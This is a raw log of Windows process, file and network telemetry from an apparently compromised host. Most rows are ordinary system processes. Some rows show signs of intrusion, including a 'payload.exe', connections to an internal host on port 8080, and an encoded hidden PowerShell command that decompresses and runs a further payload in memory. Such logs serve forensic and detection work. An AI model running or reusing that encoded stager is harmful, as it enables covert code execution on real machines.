8daa31fbb6dfc08603094fc71a423c8113047c6eba3cb7c1c056b60ab92558bf,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalServiceAndNoImpersonation'},473600
d592b5fb5ac571fdf49a355e43aec4b3080489d20b4371a8a685404918f162b3,{'subject': 'c:/program files/vmware/vmware tools/vmtoolsd.exe C:/Program Files/VMware/VMware Tools/vmtoolsd.exe'},473602
d1343f476ec0143c42a7065386cdf5fcb6b9e36c87d9e78630cd6bb5531e167d,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k bthsvcs'},473604
849dbbd7901f95e8d9447a2d3934e8a4578915a0267b789b70311a9adcdcb3cc,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k secsvcs'},473608
9ec2e230b93fbd61e31aefd701b472be216c4d065948ae4b901bc4b58ad6c791,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k WerSvcGroup'},470039
df7c1e8df37dad4e92bcb1b5a2d7b2f32cc970a2f0821b695e3883d68ecedcec,{'subject': 'c:/windows/system32/werfault.exe werfault.exe /h /shared Global/0b1b4811f8354baa85133a8866e3764c'},470040
bbb0bc77e654b7cff0faa53d0df36fb50534b9ce12a302cf8ce4817808ff47f2,{'file': 'c:/windows/system32/cmd.exe'},538
2d1777e046f038d77ca598f2d3470df7d68415587970d8af1d68ed03f93729e4,{'subject': 'c:/windows/system32/cmd.exe C:/Windows/system32/cmd.exe'},473124
5ffe6c979758ed98bbdeb2682958b5e2f8edf028e0e4b4d4172c435d649dcbd0,{'file': 'c:/windows/explorer.exe'},14375
6ee22cacc0f8dfb2fa1e0c10872fb0dc6f90141e930a124373f44fbe4aafa6ea,{'subject': 'c:/windows/system32/dwm.exe C:/Windows/system32/Dwm.exe'},471088
5da757b67c14c1c51e782bbd79e316f36a6adedf09ae4263ad124419962a2d68,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE  /Embedding'},471095
bb1cbcf3dabfc6f45dc55a2d794b53d83a7d3f011c541736accbd1514364aabd,{'file': 'c:/windows/system32/taskhost.exe'},115770
dcdc1f556d3a5a9b2b22667bbbec6907cf57ff92f906bb00a7ab897f88c9bf07,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 1684006446-1058827808936043199-1597127883207347087914054253422057058390-1254866157'},473156
ed01506336b7b1409f3f00e9bf0d45eefd14b3a84b8ee017038abd53216d5ac4,{'file': 'c:/program files/confer/repux.exe'},1097
4e9c2e1b5c0ff46460ada4e4b1c948870a184800c283c086ce201cab3b002dd3,{'file': 'c:/windows/system32/conhost.exe'},115786
97dce3c0dd70f86ddf396ea422e228c5308c9a6853281987aa9105d45dab163b,{'subject': 'c:/windows/system32/mmc.exe C:/Windows/system32/mmc.exe C:/Windows/system32/eventvwr.msc /s'},473675
f57d06d723144394de09948ffd85bf028bae5a03ef57141803ba86f7541f5f0a,{'subject': 'c:/windows/system32/consent.exe consent.exe 984 378 015BDEA0'},473676
9c11618608817838c73bcf72731e90c0ec1a50cb5e4a82deda97fcc8859ec54c,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},473677
6a82b7343d9f1052b407c83eced4b40e855c59f90af81a397455e1c7f95eb267,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},473678
84c0a744defba29b0700174b32b0487a0311852dad8eb6d2ce6560ba85d11ba0,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -1954982672-1395070906-900951638-1122404726-1939151056-862880661802321035874149057'},471117
c98d019f5c441131ee744378632071e99f3767bb8b458b9973db1fd46c31474f,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalService'},471120
867f9ca868ed3eb6b12e56e9ff1befdede98705ed540edd9f564c369126cf611,{'subject': 'c:/windows/system32/taskhost.exe taskhost.exe $(Arg0)'},471121
49ddc3ac7e81964e3b7128d382c25833f01994482dd9474ab2807a3903ee95ed,{'subject': 'c:/windows/system32/mmc.exe C:/Windows/system32/mmc.exe C:/Windows/system32/eventvwr.msc /s'},473679
6958cdcf8e6cb72b5bfbd6fcb61f6e20472005cd80597f9e3c71f0047bfed09f,{'subject': 'c:/windows/system32/sc.exe C:/Windows/system32/sc.exe start w32time task_started'},471118
1c205bce21bc0cd2ddc8d442e9087fe0af3c3aad991016e19bb03fa26b5935f3,{'subject': 'c:/windows/system32/werfault.exe werfault.exe /h /shared Global/fa145d01437842be9cae200f7cf2c642'},470100
1ec06d411d0a94385ec6cd8d5b0bfac4e80654656dabe379fea15fb506c27eff,{'subject': 'c:/windows/system32/lsass.exe C:/Windows/system32/lsass.exe'},470101
b93f6d93f15b971705003609c99e8b490f9ddefbc82450375953f721908a759a,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -1454781919665776027409471252-1463007811582918458327113294-8383078871910407818'},471126
1ab5ad9a51abfe7b0a78bfda9162bd6843a501ec1752072547ce4c90f4a2b61c,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE '},470102
6c04df483dd41ba51ed5874ad4c3385f50956ae2415141caf8c967186847128c,{'file': 'c:/users/aalsahee/payload.exe'},425573
719327ab3df2156c965167a5a17c6e045670be3c9a1488727da882ca50d78d2a,{'subject': 'c:/program files/confer/repux.exe repux.exe'},473716
3afcd50281bbb6d2db58584fd67eafbc7ac64f1301d132e63d4369cb87d1d112,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},473719
aefdf16c043414d10571c7e7d61521885f96c9b62d1319265f081739078706a0,{'subject': 'c:/program files/wireshark/dumpcap.exe C:/Program Files/Wireshark/dumpcap.exe -D -Z none'},473720
6b8bdc2dfb0c7f221ff28b88d9a331c0fab3892cf2d544be7334f95d644ca5e6,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 728820431-193461325019446751005937004352857795001894683291-95413493-644488165'},473721
aacfcc329737f9cea53db3197529d7a1200614dd263fa530e47f5165bc43ea9e,{'subject': 'c:/program files/wireshark/dumpcap.exe C:/Program Files/Wireshark/dumpcap.exe -D -Z none'},473724
2f9464c6cc4a160caae7e6f98b2f7fc6cba50c972175599f52a83e084922a4d2,{'netflow': '192.168.223.128:50078->34.107.221.82:80'},471677
0054e5f2c0e98b0edb57d95f3c88e7401497a2864e5c1ee5cd96d5bd3b2e3012,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 12403630871843726068-46206208617490045611014032448585192353-2481859871912781597'},473725
accf080ec435a29c77d5698a345d776beae8506682a62d3bdd12fa2279cbf32c,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}'},473727
0f7df5ed22afe9972d5eb5a3de57d5984d63fa395aa7db2e4848e27ea91f55a1,{'file': 'c:/windows/sysmon.exe'},85119
1f5ccb718cff65b4dd2cf0542c324fa3c3cda8a8fb4e02e36b8100ca0b2ee358,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k LocalSystemNetworkRestricted'},470162
f3e69cf5422b7e90fe3dcedc417393f3640f0a95a5491ee16f91909cf0e52c68,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE '},470163
dbd6f8eee20e371709c9eaf4af930749cca00182eb63f48603dac0f42c31487b,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k LocalServiceNetworkRestricted'},470169
9fc46fecd79f5630f16d281052bd75f52ab90b26abc206c334c7d8e46d74c455,{'file': 'c:/windows/system32/dllhost.exe'},77472
4fb7fe201439f5c1e9f262d2e85f5e7060612bddb799213d980ca75f12e42cd1,{'netflow': '192.168.223.128:49289->34.107.221.82:80'},473761
a33d6ac4090d4f6c90a65e29389fb41717be60ceef269e0e7596f1debb7ec9a9,{'subject': 'c:/windows/system32/lsm.exe C:/Windows/system32/lsm.exe'},471717
0a689677a786b6edca086ceefa70b8be0533effd33547226e273f00642664c41,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},471718
f7544e6c7fafe605c1e9ed5b22d4ae4dad32a14c73b0ad82e4a9dea343306272,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},471719
55370c84a6e31434690b8e98ee96a473357a7683c264db697055c68d4d76a1fa,{'file': 'c:/windows/system32/mmc.exe'},78504
e2d25c55d94c564e7853d403ee7365f331774634af17a079d2bd3649b05a8740,{'file': 'c:/python27/python.exe'},1207
bdeaa7d6a1d085d4a55638b37f91b3b1b0fc02132e00923b2c70f36f812f0fd7,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},470201
519a5da286e4488ddcaff5d8d539f20aed6208e53d869dd296b92e8db5c87dcc,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},471740
251afe413d10b4989f859de2902c1e5b2e384253d4a428d048d4a4ebfacc296e,{'subject': 'c:/windows/sysmon.exe C:/Windows/Sysmon.exe'},470208
920e827e22d87ad6c7a078a2ed5f2304e8eb138b6b2d72d805c347c90f22c1b4,"{'subject': 'c:/windows/system32/csrss.exe %SystemRoot%/system32/csrss.exe ObjectDirectory=/Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'}",470209
3c4203fd827faf83805cf8409448d96676cdc3fdaa3eff58ff6dc71f896c8783,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 1486231104-1106063243-1384596938-1462867873-18533603131287421695-102502181-1416252299'},470210
00a283993d842930af86b30653d9414aa5201c567688b2aa5f8425438d9c0dd4,"{'subject': 'c:/program files/confer/scanner/upd.exe C:/Program Files/Confer/scanner/upd.exe  --install-dir=C:/Program Files/Confer/scanner/Data_0 --internet-srvs=http://updates2.cdc.carbonblack.io/update2 --key-dir=. --master-file=/idx/master.idx --no-config --no-dns-resolve --product-file=/idx/savapi4lib-win32-en.info.gz --quiet --update-modules-list=VDF,AVE2'}",470211
b3b81c3e669895976ec2d3a398852d82835980935e465cb7054b21b1ef614a8f,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe -contentproc --channel=3900.0.709684863/854218346 -greomni C:/Program Files/Mozilla Firefox/omni.ja -appomni C:/Program Files/Mozilla Firefox/browser/omni.ja -appdir C:/Program Files/Mozilla Firefox/browser  3900 /./pipe/gecko-crash-server-pipe.3900 tab'},473292
7405d4474308b14a6568f74897ed7e90faea647730aba534aa3354d897656f36,{'file': 'c:/windows/system32/schtasks.exe'},67830
457b71eba2406e71b8ae80d5f4e7fd18148d9223243545b5670dede8493a2253,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},473340
5fd786cc5a2c51d6d371db1b30f04a41af81eb5acfeb6f8c1100d52f9db7c8c4,{'subject': 'c:/windows/system32/searchprotocolhost.exe C:/Windows/system32/SearchProtocolHost.exe Global/UsGthrFltPipeMssGthrPipe7_ Global/UsGthrCtrlFltPipeMssGthrPipe7 1 -2147483646 Software/Microsoft/Windows Search Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot) C:/ProgramData/Microsoft/Search/Data/Temp/usgthrsvc DownLevelDaemon '},470784
8b71202901e337e2f8a552e6b75dd17b11f00ad9ec3b23937d151a7782cb5bc1,{'file': 'c:/program files/mozilla firefox/firefox.exe'},1284
d096cb842f48dde704a4765979d7d52be4e4fcd77edfa2e5430e709a2d6a93aa,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE  /Embedding'},470790
442d9c1f337b9772e5054e70ef1d23813c1416b6d274729b656cc97f78433aa4,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe '},469766
b151d42f07bc4291e3a61a0c891e8dbae98744baa8e1ae69701d8d7c914593b3,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0x334'},471309
d14bf11d49c48da7c390661015ae1c196fcc6c690bd870162f111f92abefe861,{'file': 'c:/windows/system32/audiodg.exe'},245523
d0c61b08c6b1bc6ab5f6662450259c205861610ae17af17b3f76e7d29d464535,{'subject': 'c:/program files/confer/repmgr.exe C:/Program Files/Confer/RepMgr.exe'},469791
3ac5bcb5564466e64aa8ab3ac8bd24ecf9b408dd2b4dc20f94241478788f701d,{'subject': 'c:/program files/confer/scanner/scanhost.exe scanhost.exe'},470834
c1b3ef68785c35d696c6cb4858e30fa0d28c579dc467c7c262175020c0d9a02e,{'netflow': '192.168.223.128:50144->10.193.66.115:8080'},470840
cbe2a221c69beaeff680b631ea18cde8fd920fc24f84f1dea19e9171a2b5a4b0,{'file': 'c:/program files/microsoft office/office14/winword.exe'},1336
f5e5de63899fa603fb639254ae05b6204bc3c349af52261794b6fbdf07e71b8c,{'subject': 'c:/windows/system32/mshta.exe C:/Windows/System32/mshta.exe -Embedding'},470842
2e46575915ef8475997fec5410085520bc5e0a04340177a11cd704e69956462b,{'file': 'c:/windows/system32/lsm.exe'},124738
79cf09b6a6f4384e0ec839928f0e48780faf759279becaa509e827b5efbf3132,{'file': 'c:/windows/system32/werfault.exe'},124747
e14d5a5e73708b869dc2531e3aeb16cc50bbe92eab4a8d8d8dfc029e3c907949,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},470871
404297cdcec61adefa54feb0c8250fbb6ee631bc014842375c41b1590fb674b9,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -791083548-19581773562617740851384104673290845146-2002924840-944498995386323541'},471898
c652180a3a48efa61bad817d7707405249fb5d4212be5bba1d4f68f9e723693b,{'netflow': '192.168.223.128:50145->10.193.66.115:8080'},470875
7a2da3eb2c75aefd63a269cea94d1a58246d79db96b00efe836bff1648d7fc14,{'subject': 'c:/windows/system32/taskhost.exe taskhost.exe'},470874
17301928827cf268975cac641c965557461e70b4d7a9ccb186f66d727b3d2324,{'subject': 'c:/windows/system32/windowspowershell/v1.0/powershell.exe C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEATQBVAEwAMQAyAEkAQwBBADcAVgBYAGIAWQAvAGEAUgAnACcAKwAnACcAaABEACcAJwArACcAJwArAFgAcQBuAC8AdwBZAHEAUQBNAEEAbwBIAE4AcgBpAFgAdQAwAGkAUgBhAHMAUAB4AEYAbQB4AGUALwBIAFoAQQBVAFcAWABzAHQAYgAzAEgAMgBrAHYAcwBOAFIAeABwACsAOQA4ADcAQwAvAGoAdQBvAGwAegBhAHQARgBJAHMAVwBhAHgAMwBaADIAWgBuAG4AMwBsAG0AWgB7ADEAfQBtAEwAMQBHAGUAWQBwAHsAMQB9AEkAZQBDAEgALwA4AC8ASgBOAHcAZQBhAFoAZQA1AGkAVwBDAFcAUABHAEwAcwBGADAAWABLAHIAdABzAHUAcAAzAFcAbgBwAGMAcgBPADYAcAAxAGgAQQArAEMAdQBGAEoAMwB1AHkANQBOAFAASgB5AHUAMwA3AC8AdgBGAEYAbQBHAFUAbgBiACsAYgB2AFEAUgBVAC8ATQBjAEoAUgB1AEMAVQBTADcAVwBoAEQAOABGAE4AMABZAFoAdQBwAHAAcwBIAHAARABQAGgARAArAEUAeQB1ACsATgBQAHEARQBiAGoAMQB6AEUAagBoADMAUABqADUARgB3AHAAYQBZAEIAWAB4AHQAVAAzACsATwBlAE4AYwB3AGQAdwBVAHkAcwAvAHYAWgBiAHQAYgBhADYAawB0AGUATgB1ADAAKwBGAFIAMwBLAHgAYQBoACcAJwArACcAJwA1AHoAaABwAEoARwBRAEUAaQAxAEoAdgB4AFYANAB4AHQAYQB4AHgAMABTAHEAegByADIATQA1AHIAVABrAEQAVgBjAG4ATABaACcAJwArACcAJwBiAEQAVAB2AE4AdgBSAEEAWgBZAEcAMgBQAGQATQBSAGkARwB1AFIAVgBPAE0AegB6AGMAVABMAEUAaQBpAHcAOQBuADQAcQBiAE8AUQB1AEoAVgBSAGgATwBNACsAcQByAFEAWgBDAGgAUABLAC8AVwBoAFIAWABmAFkATABWAGUALwB5AHEAdQBMAHIAdgBQAGkANQBUAGgAQgBEAFcARwBLAFUATQBaADMAWgBrAG8AMgAyAE0AZgA1AFkAMgBCAGwAdwBZAEUAegBWAEcANABCAGkAMgBUAFoAVABpAE4AMQByAFUAYQBpAE8AMwBwAEYAbwBtAFYAdABDAEMAawBMAHYAdwBYAE0ANgBLAEIARABpAFYAMgAzADYAcwBrAHYAbABRAEMAcQBTAG4ATABhAG4AVwBJADYAaQB2AG4AMQBHAGwAUQBFAEgAVABXAHIATAA3AGkANgBJAGsASgBOAFgAaQBlADIAQQBBAEkALwBzAFYAQgBEAEUAcwBHAEgAWgBlAHQAVgB5AGoAMABQAEYARQArAHEAOQBNAEsAQQBwAC8ARgBLAGMAMwB4AFMAZgBlAEQASQBOAFUARgBIAFgAYgAzAEcATQAyAE8AOABGAG0AeABzAHsAMQB9AEwAVgAxAGsAKwBJAEMANQBWAEEAQwB0AFAANgA5ADEAcQBUAFMAMQBXAHUAVwBBAFEAdwBzADMASQBvAEQAdABiAFAAKwBsADgAUQBvAEIASgB3AHAAWAA4AHsAMQB9AGMAeABlAEYATwBFAFgAZABZACsAbwBsADIAQwAvADUASwByADQAVwBFAHgAUQBTAGQATQBLAGoAVQBZAG8AWgA0AEoANQBZAHYAUwB5AHsAMQB9AG8ASQBzAEkAaQBqAHoARwBVAGUAYgBVACsARQByAHQATABzAEgAcwBTAFYAYwByAE0AQQBsAFEAcAB2AG8AUQAxAHgAeQA4AHsAMQB9AHAARABYAHYAbgBUAG0ASABEAGkAeAAnACcAKwAnACcATwBrAHgAMQBsAEEAJwAnACsAJwAnAEIAMgA1ADIALwB7ADEAfQBhAGkAVwBFAEwARQBHAGwAOQBDAFUAegBqAHUAWAB1AC8AQgB1AEUAcQBoADMAaQA1AFgAbABkAG0AQgBhAFEAcABuADUAZABNAEoARgBIAFUARgBBAFgAMQBEAFQASABsAHkAVwAxAFkAUABRADAAcgBEADYANwBxAHgAZQBFAFkAZAAvAEwAVwBXAGwAdQBYAGYAcwBDAHoATQB1AG0ASABaAHIAbQBMAEMAdAA4AGkAQwBrAEEAWQBKAGsANwA1AEcATwBQAGMARAB6AHEAdwB7ADEAfQBBAEgAUwBEAHUAYQBPAEMAbwAzAHIANwA2AEsAUgBzAGMAagBCAEgASQBIAEwATwAwAGgARwBqAEQARABVAFQAQQBaAFoAMABvAEcAZgBwADUAWQBVAFcAdQBZAGkAQQAyAFQASABVAEUASgB5AEoAeQBLAFIAbwA5ADQARQBaAFMASQBTADQAYQBjAHEATwBWAEYASwBLAGkAKwA2AG0AYQBaAEIAbQBmAE8AYwAxAFIASwBPAEYANAA0AEMAYQBFADIAQwAnACcAKwAnACcAVwBWADEAdwBjAEUAWgB7ADEAfQB3AEwARQBFAFEAWgBtAC8AUwA4AFgAdgBxADQAOAA0AEUAcwBuAFEANQBlADQAaQBHAFYAcQByAGIAUQBqADQAKwBTAHYASABNAEwAZgBIAHoAaABCAEwALwBpAGMAMABNAHsAMQB9AFkASQBOAEgATABhAEsASgA1AE8AYgBwAFcAegBqAFYARwBmAE4ATwBjADQASwBrAEsAegAyAEsAWQBFAGoAJwAnACsAJwAnADAAWQBiAGIARQA4AFAATQBDAHIAdwAyAHQAMwAzAHcAVQBmAFIANQBRAGQAUAAzAFkASABUAGQAMwB2ADUATgBOACsANwAwAGIARgBoACsAagB7ADEAfQAzAHgAaQBxAEgANAB3AEMAZABHACcAJwArACcAJwB1AEMAMwAnACcAKwAnACcATQB4AFIAVwBHAGUAcQBEAG0AWgBZADAAcABUAFkAMQB5AFEATAB4AHYAYQBRAEwAWQBiAHEAdwBNAEoAUwB0AEkAaAA5AEkAawAzAEIAaAByAG4ASQBKAFgAdwBZAHUATAByAGYAMQBUADQAZgBXAGoAbgBRAFYARgBFAEcAOQA1AEwAYQBiAGkAdQBUAHQAcgBRAEYAOABCAFoAWQBqAHIAWgBxAFkAQwBUADQAOABEAGkARwBNAFIAVABUAHkAVgB7ADEAfQBiADUAcABvADAASgBIAGUAagB6AG4AegBqAHQAJwAnACsAJwAnAG4AcABMAGwAdwB5AGEAUwBpADgATwBYAFoAcQBiADEANAB0AHUAcwA5AG0AOABEAGIAegArAEwAeQBSAFEATgBSAHEAMABTAE8ARQA1AGMAMgBvAE4ALwBFAFIAcgBOAGgAMAA5AFkASgBZACcAJwArACcAJwB0AEcANQBiADkATgB2ADcATQAnACcAKwAnACcAegAyAG0ANQB0ADkAZQBlACsANQB7ADEAfQB2AHoAQgB0ADUALwBLAEIARwBIADMAdgBCAGIAcABQAE0AOQAwAEYAYgBqAHkAdwB5AGkAMwBSAEwATABmAFIAdQBIAGoAbAB7ADEAfQB4ADMAaQBZAHYAUgBzAE8AbwBwAGIAUgAyAFUAYQB6AGUAKwAyAHcANgBUAHYAMwBTADMAYwAwADkAdQA1AG4AZQA4AFAAUwAyACsATQBIAHYAVABYAHMAeABHAE8AegBOAHoAZQBzAHoAaQBIAGEAOQBFAG0AMgBOAEwAWABCADAAagBXAHkAegBSAEYAMABXAHYARgB4ADAANQBMAEoAKwBQAE4AJwAnACsAJwAnAFcAewAxAH0AYgAwAEsAbwArAHYATABrADQANgBpADYASwBaAG0ATABkAHgAbAA3AEMAZgBiAEoAegB0AHEAUAA3AHAAMgAwAGkAUgB0ADMAagBxAFcAMwBhAEoAZAA4AEoAbQArAFAAWQBMAEQARQAzAHoARAAvAFIANgAzAFkAMgBPADUAbABSAFMAegBxADgAbQBMADEAbwAyADgAYQBNADkAegAvAGMARwBZAGIAZQB6AGwAWQB0AEUATwBaAHIANABwAE8ANQBQAGUAYQBMAHUAeABSAHAAYgA5ADAAQgB0AGIALwBlAFgARQAnACcAKwAnACcAZABPAFAASABoAGUAdQByAGQAagArACsAeAA4AHQAbQB2ADMAbgByAGoAaAA2AEoAUQBkAFgAdQBtAE0AWQA5AHcARQBRAE8ATABDAGQANQB5AEIAeABUAGUAUQBkAHIAcgBoAGYAdABRAG0AKwBvAEEAawA2AGQAawBkAEsAbgBkADMAYQBmAGgAawA0AFMAeQAvAFAAZABkAGYALwBrAEYAKwBEAG8ASgBCAEgAVAA0AHAAagBMADkAdwA0AEQAMgAvAGEARwBrAGEAVQBDADcAdgBPAHAASwBpAHYAVABwAG0ATwAxADcANAAzAHIATwB4ADgAOAAxAGoANwBOACsAcABGADYAQgB5AE0AUAAzAHAAbQBxAFcAVgA0AFAAYgArADIAMwA5ADAAMQA1AEMAWABzAHIAYQBlAHEAMABJAG4AVQBJAGEANwBhADgAcABIAGMANwBiADYAVABzACcAJwArACcAJwBtAHcANwBuAHoAMgBjAGwASAA2AGoAKwBCAE8AegBmAEUAMQBjADMAdwB1AHYAKwBuAHMAZAA0ADcANgBmAHoAWQA5AEMALwBLAHoAYQBKAEkANgBuAGoALwBZAEYANQBJAC8AQgBaAHMANQBxADMAOQBvAGMAMwBrAEEAUQByAEcANgBlAHMAMwBWAHAAWAA5AHEATgBQADIAJwAnACsAJwAnAFkAdwAzAGkAWgA5AC8AcQBoAEQALwBSAFMAWgA4AHEAdwBYAHEAWABwAGIAJwAnACsAJwAnAEgASABvAEUATQB7ADEAfQBkADUAVwBGAHEAawBlACcAJwArACcAJwB6AFgAcQBYAFoAagBXAGwAbQBHAHUASQBJAGwAeAA3AHQAaQBoAEwARQBZAEYANwBBACcAJwArACcAJwB0AHcAawB5AHUAeABXAEMAYQBFACsANwA1AFcAOABxAFUARwBiAFAAagBkAFAAMwBzAHYAdAA0AGMAbQBsADEAMABZADEANABVAG0AdwA5AHQAeABDAHkANgBuADMANwA1AGYAewAxAH0ASQB0AFEATABuAHMAeQBOAE0AJwAnACsAJwAnAFUAbwBqAEYAdABlAGwAeAA3AFkAawBRAGUAdQBUAEgAaQBYAGwAVgBCAGkAKwAvADIAQQBkAHUAagB1AEsASgAyAE4AMQAzAGoAdwBCAGwAOQBJADIATwBkAGsARwBjAHoAewAxAH0AVQBSAFAARgBIAFEAdwBVADMASgBBAGIARgArAHAAdAB7ADEAfQBmAFEAcwAzADIASAB7ADEAfQBMAHgAUgBWAHEALwBiAG4AbQBjAGYAUQAnACcAKwAnACcAMABTAHMAbABMADcARQA2AEgAZQBtAEwAQgBTACsAQQBBAE0AUgBsAE8AdgBlAEoAWABvAHoATQA5AHcATQBBAFYAKwBpAFIAVQBHAEwAOAA0AHYATAB5AEkAVgBJADUAcQA5AGkATQBwAGMAeQBuAGMATQBmAHcARQAvADAASwBaADUANwBsAC8AVwBQADAAdQBHAGsAbAAxAGoAcwAxAFgAawAxADkATwB2AE8AaAAyAFAAKwB6ADAAcgBvAGMAWgB5AEoAbgBRAGYAQQB7ADEAfQA2ADMANABWAGUAQgBlAEcAUwBJAGkAOQBpAEMAMgBFAEIALwBvAGUAWABoAC8AOQBCAG0AQgBUAHMAeQBvAEEATAA1ADYAbgA5AC8AUQAyAGgAZgAxAGYAeQBtAHsAMQB9AHcAQQBBAEEAewAwAH0AewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBnACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA'},470881
0b1f52205ced70b9fd84ef3ce24cbabcee37416aed61dddcdbc2f7fe81d930a1,{'file': 'c:/windows/system32/svchost.exe'},189794
